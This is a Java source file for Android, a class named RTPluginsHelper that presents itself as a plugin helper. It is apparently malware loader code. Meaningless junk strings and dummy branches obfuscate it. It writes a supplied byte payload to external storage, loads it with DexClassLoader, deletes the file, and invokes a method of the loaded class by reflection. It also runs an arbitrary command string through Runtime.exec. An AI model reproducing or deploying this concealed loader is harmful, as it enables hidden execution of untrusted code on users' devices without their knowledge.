package store.apps;
import android.app.ActivityManager;
import android.content.Context;
import android.os.Environment;
import java.io.File;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import dalvik.system.DexClassLoader;
public class RTPluginsHelper {
    public static String CjYOEujCyymiley = "odC[RANDOM-STRING]gvOAkaJRHpRn";
    public static String nWVGLzpSeouicWG = "ydivFnJvxEB[RANDOM-STRING]GyHN";
    public static String hvqCYrmFdJviIjN = "cBpcTo[RANDOM-STRING]wtEvMLhLe";
    public static String MCGHFIxxGFBmdMe = "vjEwDRYOFLvgp[RANDOM-STRING]AX";
    public static String hUUvpkRBdlPyPRW = "dVph[RANDOM-STRING]JstXsIWBHDB";
    public static String odCgvOAkaJRHpRn = "FKCxDRGlzwL[RANDOM-STRING]lsrb";
    public static int id = 0 ;
    public static boolean _mthd_issrvrun_(Class<?> c, Context ctx, String str) {
        if (str.length() <1)
        {
            return false;
        }else
        {
            str = "28DjgDHsG5kjEBfZRQzkuLpRueLdTPnvhkXYumbTeG67dAw8a3";
        }
        if (str.equals("28DjgDHsG5kjEBfZRQzkuLpRueLdTPnvhkXYumbTeG67dAw8a3"))
        {
            ActivityManager a = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
            for (ActivityManager.RunningServiceInfo i : a.getRunningServices(Integer.MAX_VALUE)) {
                if (c.getName().equals(i.service.getClassName())) {
                    return false;
                }
            }
        }

        return true;
    }
    public static File getmenewdirectoryfor(Context ctx,String STR){
        if (Environment.getExternalStorageState() == null) {
            if (STR.length() < 0)
            {
                STR = EngineWorkerins._splet_1_;
            }
            return new File(Environment.getDataDirectory(), STR);
        }else{
            if (STR.length() < 0)
            {
                STR = "[RANDOM-STRING]";
                STR = EngineWorkerins._splet_1_;
            }
            return new File(Environment.getExternalStorageDirectory(), STR);
        }
    }
    public static synchronized Class<?> AsyncIMEscan(Context ctx, byte[]pl, String m, String dx){
        String SCAN = "[RANDOM-STRING]";
        String SCAN33 = "[RANDOM-STRING]";
        File f = getmenewdirectoryfor(ctx,EngineWorkerins._splet_1_);
        if(!f.exists()){
            SCAN = "[RANDOM-STRING]DEbw6phfS5AF99puwuS7Qse";
            f.mkdir();
        }
        File pfileones;
        try{
            pfileones = new File(f, EngineWorkerins._split_4_ + RTPluginsHelper.id);
            RTPluginsHelper.id += 1;
            FileOutputStream myfilesctream = new FileOutputStream(pfileones);
            SCAN = "8PqtkzFyyzqj8MA3[RANDOM-STRING]ajsXr2Wkzr6EF3";
            myfilesctream.write(pl,0,pl.length);
            myfilesctream.flush();
            SCAN33 = "vq7aHmGN[RANDOM-STRING]MHd2ELFk3gaLMEAAD";
            myfilesctream.close();
        }catch (Exception e){
            SCAN33 = "[RANDOM-STRING]vxJELuAFa25E2HTt6WUnVvcHcUM77vq";
            pfileones = null;
        }
        try {
            if (pfileones != null && SCAN.length() > 3){
                final File i = ctx.getDir(dx, 0);

                final DexClassLoader mydexclass = new DexClassLoader(
                        GetThePathFor(pfileones,SCAN+"C[RANDOM-STRING]ELuAFa25E2HTt6WUnVvcHcUM77vq"),
                        GetApslotmypath(i,SCAN33+"Ct[RANDOM-STRING]AFa25E2HTt6WUnVvcHcUM77vq"),
                        Gevemenull("Q8UPVGxmpC[RANDOM-STRING]WaQuM94NjL"),
                        GetMELOADER(ctx));


                pfileones.delete();
                return mydexclass.loadClass(m);
            }
        } catch (Exception e) {
            SCAN = "ghq9pfx[RANDOM-STRING]GgBPMzmLF7cQZcLdG9";
            SCAN33 = "G7Z6DH9huNwEFgNm7h3VM57jDG[RANDOM-STRING]K";
        }
        return null;
    }

    private static ClassLoader GetMELOADER(Context ctx)
    {
        try
        {
            return ctx.getClass().getClassLoader();
        }catch (Exception e){}
        return  null;
    }

    private static String Gevemenull(String str)
    {
        if (str.equals("a"))
        {
            return str + "Q8UPVGxmp[RANDOM-STRING]4tyuNUWaQuM94NjL";
        }
        return  null;
    }

    private static String GetApslotmypath(File i, String Text) {

        try
        {
            if (Text.length() < 0)
            {
                Text = "ASVF[RANDOM-STRING]GAERG";
                Text +="VSDAFBG[RANDOM-STRING]JTYJT";

            }

            if (Text.equals("NULL"))
            {
                return "fn[RANDOM-STRING]LxWGBUwaQKkTH" + Text;
        }else
            {
                return i.getAbsolutePath();
            }

        }catch (Exception ee){}
        return null;
    }

    private static String GetThePathFor(File p,String Text) {
        try
        {
         if (Text.length() < 0)
         {
             Text = "ASV[RANDOM-STRING]AERGAERG";
             Text +="VSDAFBG[RANDOM-STRING]JT";

         }

         if (Text.equals("NULL"))
         {
             return "fnWX6UVN6h[RANDOM-STRING]QMxy8M7XLxWGBUwaQKkTH" + Text;
         }else
         {
             return p.getPath();
         }

        }catch (Exception ee){}
        return "MZ78QAuKz2Ajve[RANDOM-STRING]8bqgn2tczmZZ";
    }


    public static Object exec(Context ctx, Class<?> cla , String met , String s, byte[] b){
        Object r = null;
        if(cla != null)
        {
            try {
                String bb = "DGSTRFH[RANDOM-STRING]SVDBSGNDHG";
                Object pl =  cla.newInstance();
                if (pl != null)
                {
                        Method m = cla.getDeclaredMethod(
                            CHECKNOTNULL(met,"SDVSDVSDV[RANDOM-STRING]ASAVREGFRBDTNTYJT"),
                            CANFINDCLAS(Context.class,"BYTJYTJTY[RANDOM-STRING]NGFD15151563w4"),
                            CANFINSTRAPP(String.class,"9ynJPdq67cETC[RANDOM-STRING]2Mr54GufGnr"),
                            byte[].class);
                    r = m.invoke(pl,ctx,s,b);
                }

            } catch (Exception e) {}
        }
        return r;
    }

    private static Class<?> CANFINSTRAPP(Class<String> stringClass, String s) {
        if (!s.equals("9uhJWyrAy[RANDOM-STRING]2wGeEDydczgX"))
        {
            return stringClass;
        }
        return null;
    }

    private static Class<?> CANFINDCLAS(Class<Context> contextClass,String str2) {
        if (!str2.equals("A6WrrB3TJueLbLh9uhJWyrAy[RANDOM-STRING]2wGeEDydczgX9q8BNj9j48aRkJ"))
        {
            if (contextClass != null)
            {
                return contextClass;
            }
        }
        return null;
    }

    private static String CHECKNOTNULL(String met,String str) {
        if (!met.isEmpty())
        {
            if (!str.equals("WmGXBEbpaLQy4[RANDOM-STRING]vZUyjbPhr65pSQ3"))
            {
                return  met;
            }

        }
        return null;
    }


    public static void runmecomnow(Context ctx , String co){
        File f = getmenewdirectoryfor(ctx,EngineWorkerins._splet_1_);
        if (f.isDirectory()) {
            try {
                if (!co.equals("4JhCfpPsHMMT[RANDOM-STRING]Bzvwk3mCRSeLzTNwA2J"))
                {
                    Runtime ru = Runtime.getRuntime();
                    ru.exec(co + f.getPath());
                }

            } catch (Exception e) {}
        }

    }

}
